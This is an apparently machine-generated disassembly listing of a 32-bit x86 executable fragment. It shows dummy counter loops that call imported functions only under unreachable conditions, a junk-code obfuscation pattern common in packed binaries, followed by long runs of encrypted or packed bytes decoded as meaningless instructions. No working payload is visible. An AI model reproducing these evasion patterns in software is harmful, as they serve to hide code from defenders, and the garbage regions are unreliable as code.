  409457:	sbb    BYTE PTR [ecx-0x56263d4e],bl
  40945d:	inc    eax
  40945e:	lock jb 0x40943b
  409461:	lods   eax,DWORD PTR ds:[esi]
  409462:	fadd   DWORD PTR [eax-0x5d]
  409465:	js     0x40944a
  409467:	(bad)  [ebx+0x47982b1]
  40946d:	xor    ch,BYTE PTR [eax+0x2406ddbc]
  409473:	inc    ecx
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43382b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x43c6e20b
  4095d3:	adc    DWORD PTR [ecx+ebx*8+0x7e],ebp
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x409572
  4095dd:	jecxz  0x409579
  4095df:	lods   eax,DWORD PTR ds:[esi]
  4095e0:	shl    DWORD PTR [edx+ecx*1-0x39],1
  4095e4:	out    dx,al
  4095e5:	or     ch,BYTE PTR [eax-0x58]
  4095e8:	int    0xbb
  4095ea:	hlt    
  4095eb:	mov    edi,0xa7ba24af
  4095f0:	repz mov eax,ds:0x5da19993
  4095f6:	es popf 
  4095f8:	nop
  4095f9:	push   ecx
  4095fa:	sub    ah,BYTE PTR [esi+0x3655e75a]
  409600:	fcom   DWORD PTR [edx-0x4]
  409603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409604:	adc    BYTE PTR [edx-0xd5903d4],ah
  40960a:	outs   dx,BYTE PTR ds:[esi]
  40960b:	es push es
  40960d:	cs (bad) 
  409610:	mov    al,0xf6
  409612:	and    DWORD PTR [edi],edx
  409614:	mov    ds:0xa5154b06,eax
  409619:	fst    st(0)
  40961b:	cdq    
  40961c:	inc    ebp
  40961d:	adc    BYTE PTR [eax+0xc],dl
  409620:	jmp    0xbccf:0x783223f1
  409627:	ss push ss
  409629:	les    eax,FWORD PTR [eax]
  40962b:	mov    ecx,DWORD PTR [edx+0x2305cff1]
  409631:	xor    al,0x17
  409633:	cmp    eax,0x5d772d7e
  409638:	mov    WORD PTR [ebx+0x71e35e76],?
  40963e:	outs   dx,BYTE PTR ds:[esi]
  40963f:	mov    esi,DWORD PTR es:[ebx+eax*1+0x48]
  409644:	xor    DWORD PTR [ecx+0x5582a7bd],ecx
  40964a:	sub    eax,0x8839554e
  40964f:	je     0x409691
  409651:	cmp    DWORD PTR [edi+0x1f4e75fe],esi
  409657:	or     DWORD PTR [eax-0x6295c918],esp
  40965d:	push   ebx
  40965e:	repnz dec edx
  409660:	fldcw  WORD PTR [ecx-0x417760fb]
  409666:	nop
  409667:	cli    
  409668:	in     eax,0x9
  40966a:	enter  0x1b5b,0xbb
  40966e:	jno    0x4096aa
  409670:	mov    BYTE PTR ds:0xdc4948a4,cl
  409676:	enter  0x644a,0x51
  40967a:	sbb    DWORD PTR [ebp+ebx*2+0x163d166b],ebp
  409681:	push   es
  409682:	adc    eax,0x79130d81
  409687:	es pop eax
  409689:	lea    ebp,[eax+ebx*4+0x77cf52ba]
  409690:	cs adc al,0xed
  409693:	in     al,dx
  409694:	pop    edi
  409695:	push   ss
  409696:	xor    eax,0xf57cd31f
  40969b:	retf   0xbaca
  40969e:	ins    BYTE PTR es:[edi],dx
  40969f:	shl    eax,1
  4096a1:	push   ds
  4096a2:	mov    eax,ds:0xcfb1383e
  4096a7:	push   edi
  4096a8:	aam    0x7d
  4096aa:	ja     0x409716
  4096ac:	lock and DWORD PTR [ecx+0x29],edx
  4096b0:	or     ah,BYTE PTR [eax+0x6484708b]
  4096b6:	push   esi
  4096b7:	xchg   BYTE PTR gs:[edx-0x538dba19],ah
  4096be:	xor    esp,DWORD PTR [esi]
  4096c0:	out    0x56,eax
  4096c2:	fisttp WORD PTR [esi-0x4c5d5d84]
  4096c8:	test   DWORD PTR [ebx-0x1a],edi
  4096cb:	push   0xfffffffd
  4096cd:	ret    
  4096ce:	jmp    0x409678
  4096d0:	add    eax,0x8e382776
  4096d5:	pop    ss
  4096d6:	inc    esp
  4096d7:	fld    TBYTE PTR [ebx]
  4096d9:	jno    0x933797f3
  4096df:	jg     0x4096fe
  4096e1:	cli    
  4096e2:	popa   
  4096e3:	mov    ebp,0x8d4044a5
  4096e8:	popf   
  4096e9:	sbb    BYTE PTR [esi],ch
  4096eb:	dec    eax
  4096ec:	pop    edi
  4096ed:	fwait
  4096ee:	xchg   DWORD PTR [edx+0x6df816dc],edi
  4096f4:	adc    BYTE PTR [esi+edi*2-0x21],cl
  4096f8:	ja     0x4096c0
  4096fa:	mov    cl,0x7d
  4096fc:	cmp    edx,ecx
  4096fe:	add    cl,BYTE PTR [esi+0x61c215b6]
  409704:	leave  
  409705:	(bad)  
  409706:	fcomp  DWORD PTR [esi]
  409708:	fwait
  409709:	adc    cl,BYTE PTR [edi]
  40970b:	leave  
  40970c:	js     0x40968f
  40970e:	push   eax
  40970f:	int3   
  409710:	imul   ebx,DWORD PTR [edi+0x5],0x49
  409714:	pop    esi
  409715:	bound  edx,QWORD PTR [edi]
  409717:	xchg   ebx,eax
  409718:	and    eax,DWORD PTR [bx-0x46f5]
  40971d:	loopne 0x40976b
  40971f:	and    al,0x4c
  409721:	jle    0x409778
  409723:	jae    0x409737
  409725:	jne    0x40973e
  409727:	shl    DWORD PTR [edx-0x5f],cl
  40972a:	mov    edx,0xb9667c58
  40972f:	xchg   edx,eax
  409730:	mov    ebx,DWORD PTR [eax+eiz*2-0x559b1014]
  409737:	and    al,BYTE PTR [edx+0xb]
  40973a:	cli    
  40973b:	adc    DWORD PTR [ebp+ebx*8+0x14],0x65
  409740:	sbb    ah,bl
  409742:	pop    esi
  409743:	pop    esp
  409744:	stc    
  409745:	mov    ch,0xc4
  409747:	or     bh,al
  409749:	int    0x4b
  40974b:	(bad)  [ebx+0x11daa528]
  409751:	xor    bl,BYTE PTR [edx]
  409753:	sub    esi,DWORD PTR [ebp+0x7d0f2e1e]
  409759:	cmp    eax,DWORD PTR [edx]
  40975b:	and    BYTE PTR [esi-0x54f2390b],dl
  409761:	add    cl,BYTE PTR [esi-0x2ece86d2]
  409767:	mov    BYTE PTR [esi],bh
  409769:	adc    cl,BYTE PTR [ebx+0x68341d50]
  40976f:	lock (bad) 
  409771:	pop    eax
  409772:	pushf  
  409773:	mov    ebx,0xfca071fa
  409778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409779:	dec    ebx
  40977a:	fs xchg esi,eax
  40977c:	mov    bl,0x67
  40977e:	repnz lods al,BYTE PTR ds:[esi]
  409780:	or     ah,BYTE PTR [ecx-0x77]
  409783:	dec    edx
  409784:	mov    ch,0xd8
  409786:	mov    dh,BYTE PTR [eax+0x3d83f5f5]
  40978c:	shl    DWORD PTR [ebx-0x5b9c01cb],cl
  409792:	int    0x84
  409794:	sub    BYTE PTR [ecx-0x4f],bh
  409797:	cmp    dl,0xdb
  40979a:	jp     0x40979c
  40979c:	jmp    0x40976b
  40979e:	imul   esi,DWORD PTR [edx+0x29],0xffffffd6
  4097a2:	push   es
  4097a3:	pop    ss
  4097a4:	in     al,0x25
  4097a6:	adc    al,0x80
  4097a8:	mov    WORD PTR [ecx],es
  4097aa:	mov    dl,BYTE PTR [edi-0x3db62a1d]
  4097b0:	mov    esi,0xd01fab21
  4097b5:	pop    es
  4097b6:	out    0x45,al
  4097b8:	sbb    esp,DWORD PTR [esi-0x50]
  4097bb:	xor    BYTE PTR [esi+0x31],ch
  4097be:	dec    eax
  4097bf:	clc    
  4097c0:	retf   0x315f
  4097c3:	xchg   esi,eax
  4097c4:	in     al,0x4f
  4097c6:	dec    ebx
  4097c7:	sbb    DWORD PTR [edx+0x6c],eax
  4097ca:	push   edx
  4097cb:	popf   
  4097cc:	(bad)  
  4097cd:	adc    BYTE PTR [ecx-0x47],bh
  4097d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d1:	aaa    
  4097d2:	not    ebp
  4097d4:	and    bh,BYTE PTR ds:0x9c4a2ec
  4097da:	jge    0x40979b
  4097dc:	inc    eax
  4097dd:	cmp    al,0x81
  4097df:	aad    0x8c
  4097e1:	dec    esi
  4097e2:	popa   
  4097e3:	cmp    BYTE PTR [ecx+0x1d],ah
  4097e6:	pusha  
  4097e7:	adc    DWORD PTR [ebp-0x37f212b2],esi
  4097ed:	iret   
  4097ee:	out    dx,al
  4097ef:	dec    esp
  4097f0:	jle    0x409822
  4097f2:	inc    edi
  4097f3:	loopne 0x40985e
  4097f5:	jg     0x4097b0
  4097f7:	test   esp,0xd9f77c52
  4097fd:	pop    esp
  4097fe:	push   ebx
  4097ff:	jl     0x40982c
  409801:	fcomp  st(0)
  409803:	idiv   BYTE PTR [edi+0x59]
  409806:	or     eax,DWORD PTR [ebx-0x7dfbe0a3]
  40980c:	cli    
  40980d:	add    eax,0x29bfb658
  409812:	mov    esi,0xf00c56c5
  409817:	add    al,0xea
  409819:	std    
  40981a:	imul   ecx,DWORD PTR [esi-0x72e509e9],0xffffffba
  409821:	cli    
  409822:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  409824:	lods   eax,DWORD PTR ds:[esi]
  409825:	loope  0x409839
  409827:	outs   dx,DWORD PTR ds:[esi]
  409828:	retf   0x9d3d
  40982b:	iret   
  40982c:	cmc    
  40982d:	psubq  mm0,QWORD PTR [edx]
  409830:	push   ecx
  409831:	loop   0x4097e0
  409833:	ins    BYTE PTR es:[edi],dx
  409834:	mov    eax,ds:0x1a901a18
  409839:	stos   DWORD PTR es:[edi],eax
  40983a:	or     DWORD PTR [edx],esi
  40983c:	fcom   DWORD PTR [eax]
  40983e:	pop    ebx
  40983f:	sti    
  409840:	pop    es
  409841:	lods   al,BYTE PTR ds:[esi]
  409842:	ins    DWORD PTR es:[edi],dx
  409843:	and    ebx,ebp
  409845:	sub    cl,cl
  409847:	mov    ds:0xaa2af56e,eax
  40984c:	out    dx,al
  40984d:	xchg   DWORD PTR [esp+eax*4+0x6f],esp
  409851:	fild   DWORD PTR [ecx+0x785443bc]
  409857:	daa    
  409858:	xor    eax,0x3fdeef9f
  40985d:	nop
  40985e:	mov    esp,0xa8ae2e7
  409863:	xor    al,0x20
  409865:	push   esi
  409866:	lods   al,BYTE PTR ds:[esi]
  409867:	push   edi
  409868:	cmc    
  409869:	sbb    bh,bl
  40986b:	fs es mov dl,0xbe
  40986f:	gs (bad) 
  409871:	adc    al,0x6d
  409873:	enter  0x290f,0x31
  409877:	inc    edi
  409878:	mov    eax,0xb527ef4f
  40987d:	inc    esi
  40987e:	fxch   st(6)
  409880:	push   ebx
  409881:	call   FWORD PTR [edx-0x2b1742cb]
  409887:	mov    esp,0xb83d834
  40988c:	icebp  
  40988d:	test   al,0x59
  40988f:	ret    0x200a
  409892:	shr    DWORD PTR [ecx+0x48c08205],1
  409898:	(bad)  
  409899:	fistp  QWORD PTR [ecx]
  40989b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989c:	popa   
  40989d:	mov    ds:0x7bee6ec,eax
  4098a2:	ficomp DWORD PTR [ecx+0x4af952c]
  4098a8:	(bad)  
  4098a9:	lods   eax,DWORD PTR ds:[esi]
  4098aa:	ins    BYTE PTR es:[edi],dx
  4098ab:	sub    BYTE PTR [ebx-0x108204e6],0xf6
  4098b2:	mov    ch,0xb3
  4098b4:	sbb    eax,0x5bb66c13
  4098b9:	sub    cl,BYTE PTR [esi+0x99abb60]
  4098bf:	fadd   DWORD PTR [edx+0x6a6d00e5]
  4098c5:	std    
  4098c6:	inc    ecx
  4098c7:	outs   dx,DWORD PTR ds:[esi]
  4098c8:	sbb    eax,0x25aded8f
  4098cd:	(bad)  
  4098ce:	jno    0x40992e
  4098d0:	mov    BYTE PTR [ebx],al
  4098d2:	sbb    BYTE PTR [edx],bh
  4098d4:	pop    es
  4098d5:	scas   al,BYTE PTR es:[edi]
  4098d6:	mov    DWORD PTR [edi],0xf3f41720
  4098dc:	inc    eax
  4098dd:	jmp    0x81c9:0xb70f1c49
  4098e4:	sbb    eax,0x43383b
  4098e9:	and    ebx,DWORD PTR [edx+0x0]
  4098ec:	add    BYTE PTR [ebx],al
  4098ee:	or     BYTE PTR [ecx],dl
  4098f0:	sbb    eax,0x4337a7
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fnstsw WORD PTR [esi+0x689a46e2]
  4099c2:	in     al,0x7e
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x409956
  4099ca:	xchg   esp,eax
  4099cb:	ins    DWORD PTR es:[edi],dx
  4099cc:	stos   BYTE PTR es:[edi],al
  4099cd:	push   esi
  4099ce:	mov    al,ds:0xb70b514a
  4099d3:	(bad)  
  4099d5:	inc    eax
  4099d6:	loope  0x4099f8
  4099d8:	jecxz  0x409a15
  4099da:	lock sub cl,BYTE PTR ds:0x784bf705
  4099e1:	mov    ch,0x85
  4099e3:	jge    0x4099ac
  4099e5:	inc    ebp
  4099e6:	add    cl,bh
  4099e8:	bound  eax,QWORD PTR [edx]
  4099ea:	pop    es
  4099eb:	rcr    BYTE PTR [eax+0x178a041a],0x58
  4099f2:	test   esp,eax
  4099f4:	(bad)  
  4099f5:	icebp  
  4099f6:	dec    esi
  4099f7:	push   edx
  4099f8:	cli    
  4099f9:	and    DWORD PTR ds:0xfc5fd839,0x7c4eca9b
  409a03:	jge    0x409a08
  409a05:	js     0x409a6d
  409a07:	add    dh,ah
  409a09:	scas   eax,DWORD PTR es:[edi]
  409a0a:	mov    esp,0xc3571c09
  409a0f:	in     eax,0x19
  409a11:	jmp    0x3fcb:0xc6b22695
  409a18:	mov    bh,BYTE PTR [edi-0x53]
  409a1b:	mov    eax,0x42b8c15c
  409a20:	ins    DWORD PTR es:[edi],dx
  409a21:	xor    BYTE PTR [edx-0x70],dl
  409a24:	cs push ebp
  409a26:	xor    eax,0x44369ba0
  409a2b:	loopne 0x4099f5
  409a2d:	(bad)  
  409a2e:	in     al,dx
  409a2f:	ins    DWORD PTR es:[edi],dx
  409a30:	lods   al,BYTE PTR ds:[esi]
  409a31:	les    eax,FWORD PTR [esi-0x42]
  409a34:	pop    es
  409a35:	xor    BYTE PTR [edx+edx*2],0x1e
  409a39:	dec    ecx
  409a3a:	ret    0xf6df
  409a3d:	fwait
  409a3e:	and    BYTE PTR [edi+0x5d96d750],bl
  409a44:	clc    
  409a45:	mov    dl,0xf1
  409a47:	cs jnp 0x409aa7
  409a4a:	adc    DWORD PTR [edi-0x56],edx
  409a4d:	std    
  409a4e:	je     0x409a12
  409a50:	(bad)  
  409a51:	dec    edx
  409a52:	mov    edx,0xcc655537
  409a57:	pop    eax
  409a58:	pop    edx
  409a59:	ins    DWORD PTR es:[edi],dx
  409a5a:	imul   ebx,DWORD PTR [eax+ecx*1+0x53],0x6dd087be
  409a62:	push   DWORD PTR [eax+0x54c66ada]
  409a68:	(bad)  
  409a6a:	daa    
  409a6b:	and    bh,BYTE PTR [eax+0xe]
  409a6e:	popf   
  409a6f:	adc    eax,DWORD PTR [esi-0x3b]
  409a72:	pop    ebp
  409a73:	xchg   esi,eax
  409a74:	lea    edx,[ecx+ebp*4]
  409a77:	leave  
  409a78:	out    0xb1,al
  409a7a:	fmulp  st(6),st
  409a7c:	in     al,0x75
  409a7e:	cdq    
  409a7f:	aaa    
  409a80:	jns    0x409a9e
  409a82:	mov    edi,0x304fe0c5
  409a87:	mov    al,ds:0x9fa406b3
  409a8c:	sti    
  409a8d:	sub    eax,0xfabb7892
  409a92:	pop    edx
  409a93:	cld    
  409a94:	or     BYTE PTR [ebp+eiz*8-0x1c],dh
  409a98:	and    BYTE PTR [edi-0x567c3795],al
  409a9e:	mov    ecx,0xa17bc510
  409aa3:	and    BYTE PTR [ecx-0x23],0xfa
  409aa7:	add    cl,dh
  409aa9:	inc    esp
  409aaa:	and    al,0x2b
  409aac:	mov    ?,WORD PTR [eax-0x4b]
  409aaf:	ds dec edi
  409ab1:	or     ch,ah
  409ab3:	shl    cl,cl
  409ab5:	fs ja  0x409b1e
  409ab8:	ins    BYTE PTR es:[edi],dx
  409ab9:	push   ebp
  409aba:	mov    edi,0x934192bc
  409abf:	mul    DWORD PTR [ecx]
  409ac1:	pusha  
  409ac2:	sbb    DWORD PTR [ecx+0x6f],ebp
  409ac5:	cs dec esi
  409ac7:	xor    al,0x7a
  409ac9:	repnz bound esi,QWORD PTR ss:[edi+0x3a]
  409ace:	sbb    eax,0xd67d4bc8
  409ad3:	sbb    al,bl
  409ad5:	out    dx,eax
  409ad6:	inc    esp
  409ad7:	mov    ecx,ebx
  409ad9:	shl    dh,cl
  409adb:	pop    ds
  409adc:	shl    BYTE PTR ds:0x3384c7b7,1
  409ae2:	or     BYTE PTR [edx-0x77],dh
  409ae5:	ret    0xc759
  409ae8:	xor    edi,DWORD PTR ds:0x7890bb52
  409aee:	gs xchg edi,edx
  409af1:	or     al,ah
  409af3:	xor    al,0x4a
  409af5:	(bad)  
  409af6:	jg     0x409ae2
  409af8:	in     eax,dx
  409af9:	(bad)  
  409afb:	and    edi,DWORD PTR [ebx]
  409afd:	adc    edx,DWORD PTR [eax]
  409aff:	xchg   bl,bh
  409b01:	mov    esi,0x8cd0c71f
  409b06:	cmp    DWORD PTR [ecx+0x72],0xa6d4f11a
  409b0d:	into   
  409b0e:	mov    ds:0x379a1cac,eax
  409b13:	loop   0x409acb
  409b15:	icebp  
  409b16:	adc    ebp,DWORD PTR [esi-0x58]
  409b19:	dec    esi
  409b1a:	ret    0x5316
  409b1d:	lahf   
  409b1e:	pop    edx
  409b1f:	add    edi,ecx
  409b21:	(bad)  
  409b22:	xchg   ebx,eax
  409b23:	test   al,0x1d
  409b25:	leave  
  409b26:	mov    dh,0xc6
  409b28:	cmp    cl,cl
  409b2a:	cdq    
  409b2b:	and    DWORD PTR [ecx+esi*8-0x6de1a34e],edi
  409b32:	push   esp
  409b33:	test   bl,dl
  409b35:	or     eax,0x497e1a31
  409b3a:	add    eax,0xc8943371
  409b3f:	int3   
  409b40:	ret    
  409b41:	xlat   BYTE PTR ds:[ebx]
  409b42:	push   esp
  409b43:	mov    edi,0xd68c3b6e
  409b48:	cmp    dl,BYTE PTR [eax+0x1cc93cb4]
  409b4e:	(bad)  [esi]
  409b50:	out    dx,eax
  409b51:	data16 int3 
  409b53:	dec    edi
  409b54:	imul   BYTE PTR [ecx+edi*2]
  409b57:	ins    DWORD PTR es:[edi],dx
  409b58:	push   esi
  409b59:	lods   al,BYTE PTR ds:[esi]
  409b5a:	xchg   ebx,eax
  409b5b:	aaa    
  409b5c:	jg     0x409bbb
  409b5e:	xchg   BYTE PTR [ecx-0x6f],bh
  409b61:	add    eax,0x96a2f592
  409b66:	xor    DWORD PTR [ebp-0x6c591d3],eax
  409b6c:	mov    ds:0x9144186c,eax
  409b71:	ins    DWORD PTR es:[edi],dx
  409b72:	sar    ecx,0x37
  409b75:	ss xchg ebp,eax
  409b77:	or     BYTE PTR [edx],bh
  409b79:	rol    DWORD PTR [edx-0x4fc80caa],1
  409b7f:	(bad)  
  409b82:	gs jmp 0x409b26
  409b85:	out    dx,al
  409b86:	xor    eax,0x339064b6
  409b8b:	mov    cl,0x41
  409b8d:	stos   BYTE PTR es:[edi],al
  409b8e:	cmp    ebp,DWORD PTR [esi-0x46]
  409b91:	adc    BYTE PTR [edi+0x29],bh
  409b94:	or     al,0x1b
  409b96:	or     BYTE PTR [edx+0x2db8e92e],cl
  409b9c:	cwde   
  409b9d:	add    eax,0xca111a63
  409ba3:	jns    0x409c0c
  409ba5:	inc    ebp
  409ba6:	fsubr  DWORD PTR [ecx+0x76f19ce4]
  409bac:	cld    
  409bad:	mov    edi,0xee113197
  409bb2:	out    dx,al
  409bb3:	push   edi
  409bb4:	add    DWORD PTR [esi+ebp*4+0x7d],0xb6074754
  409bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bbe:	sahf   
  409bbf:	sub    ch,BYTE PTR [esi-0x17]
  409bc2:	jg     0x409bfd
  409bc4:	dec    edx
  409bc5:	push   ss
  409bc6:	sub    ah,BYTE PTR [ebx+0x2b]
  409bc9:	mov    esp,0x3a896441
  409bce:	pusha  
  409bcf:	sbb    ch,al
  409bd1:	xchg   esp,eax
  409bd2:	icebp  
  409bd3:	and    eax,0x31dd6751
  409bd8:	bound  edi,QWORD PTR [eax]
  409bda:	pop    edx
  409bdb:	cwde   
  409bdc:	arpl   WORD PTR [ebx+0x6e],bx
  409bdf:	xchg   ebx,eax
  409be0:	xor    bh,BYTE PTR [eax+esi*4-0x1dd753ca]
  409be7:	nop
  409be8:	hlt    
  409be9:	mov    dl,ah
  409beb:	mov    ebp,DWORD PTR [eax+0x3a825501]
  409bf1:	jbe    0x409c02
  409bf3:	mov    bh,0x1d
  409bf5:	and    ah,BYTE PTR [ecx-0x29403772]
  409bfb:	cmp    cl,BYTE PTR [ebp+0x75]
  409bfe:	sbb    BYTE PTR [edi-0x4a1209d7],cl
  409c04:	jecxz  0x409bfc
  409c06:	pusha  
  409c07:	adc    DWORD PTR es:[esi-0x59a98b8a],ebp
  409c0e:	loop   0x409bbf
  409c10:	bound  ebx,QWORD PTR [ebx+0x79]
  409c13:	stc    
  409c14:	mov    esp,0x89171dc9
  409c19:	cmp    eax,0x996b0c2
  409c1e:	out    0xfd,eax
  409c20:	ins    DWORD PTR es:[edi],dx
  409c21:	les    ecx,FWORD PTR [edi+ecx*2-0x4d]
  409c25:	mov    esp,0x32c2b9d9
  409c2a:	ja     0x409bcd
  409c2c:	push   es
  409c2d:	call   0x91eb3e2
  409c32:	loopne 0x409c58
  409c34:	cmp    al,0x6
  409c36:	or     ecx,DWORD PTR [edx-0x1f44a32d]
  409c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c3d:	cli    
  409c3e:	icebp  
  409c3f:	mov    cl,0x59
  409c41:	inc    esi
  409c42:	xor    DWORD PTR [eax+eiz*2],ebp
  409c45:	push   eax
  409c46:	jae    0x409cb7
  409c48:	imul   edx,ecx,0x2b
  409c4b:	(bad)  
  409c4c:	enter  0xb35,0x93
  409c50:	in     al,0x94
  409c52:	mov    bl,al
  409c54:	imul   esp,DWORD PTR [ecx-0x7f],0xffffffcd
  409c58:	int    0x16
  409c5a:	rcl    DWORD PTR [eax+0x52],cl
  409c5d:	repnz sub al,0x4f
  409c60:	or     ah,BYTE PTR [ebp-0x26d153af]
  409c66:	(bad)  
  409c67:	retf   
  409c68:	push   edx
  409c69:	test   BYTE PTR [edi-0x7e856213],cl
  409c6f:	lahf   
  409c70:	adc    ch,BYTE PTR [edx-0x196da2bb]
  409c76:	xor    ch,BYTE PTR [ebx+edx*1+0x3c65b587]
  409c7d:	dec    ebx
  409c7e:	mov    al,0x98
  409c80:	aam    0x9f
  409c82:	inc    edi
  409c83:	sbb    bl,ch
  409c85:	cmp    ecx,DWORD PTR [ebx+eax*1+0x70]
  409c89:	(bad)  
  409c8a:	pop    esi
  409c8b:	pop    es
  409c8c:	inc    esp
  409c8d:	(bad)  
  409c8f:	add    eax,0xb0981a27
  409c94:	push   edx
  409c95:	(bad)  
  409c96:	fidiv  DWORD PTR [esi]
  409c98:	jge    0x409c6f
  409c9a:	loop   0x409cbb
  409c9c:	xchg   ebx,eax
  409c9d:	imul   edi,DWORD PTR [ecx-0x2e],0x7153d44f
  409ca4:	lds    ecx,FWORD PTR [edi+0x34]
  409ca7:	je     0x409d19
  409ca9:	push   esp
  409caa:	sahf   
  409cab:	fimul  DWORD PTR [edi+0x8]
  409cae:	mov    al,0x3a
  409cb0:	int    0x8d
  409cb2:	mov    edx,DWORD PTR [edx-0x77960e2]
  409cb8:	and    al,0xda
  409cba:	int3   
  409cbb:	clc    
  409cbc:	(bad)  
  409cbd:	int3   
  409cbe:	and    ebp,esi
  409cc0:	shl    BYTE PTR [esi-0x7cd0de2d],cl
  409cc6:	enter  0x90c7,0x18
  409cca:	stos   BYTE PTR es:[edi],al
  409ccb:	push   es
  409ccc:	inc    esi
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	stos   BYTE PTR es:[edi],al
  409cfa:	scas   al,BYTE PTR es:[edi]
  409cfb:	pop    ss
  409cfc:	jnp    0x409d72
  409cfe:	jecxz  0x409d7e
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409d20
  409d06:	test   BYTE PTR [edx+0x2b],0xb
  409d0a:	and    ch,bl
  409d0c:	retf   0xae17
  409d0f:	push   ebx
  409d10:	dec    edx
  409d11:	nop
